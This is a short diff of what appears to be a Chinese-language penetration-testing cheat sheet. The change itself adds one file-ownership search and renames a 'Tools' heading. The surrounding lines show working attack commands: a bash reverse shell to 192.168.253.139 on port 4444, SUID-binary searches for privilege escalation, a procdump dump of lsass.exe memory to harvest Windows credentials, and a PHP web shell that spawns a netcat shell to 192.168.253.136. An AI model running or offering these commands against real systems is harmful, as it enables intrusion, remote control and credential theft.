@@ -66,6 +66,7 @@ bash -c 'sh -i &>/dev/tcp/192.168.253.139/4444 0>&1'
 find / -user root -perm -4000 -print 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} ;
 find / -perm -u=s -type f 2>/dev/null
+find / -nouser -o -nogroup
 ------------------------------------------------------
 "/"命令可直接运行/bin/sh或/bin/bash
 "cp"命令可将/bin/sh或/bin/bash复制到当前目录
@@ -170,7 +171,7 @@ procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件l
 <?php system("nc -e /bin/sh 192.168.253.136  4444"); ?>
 ```
 
-## Tools
+## Other
 
 ### MySQL
 
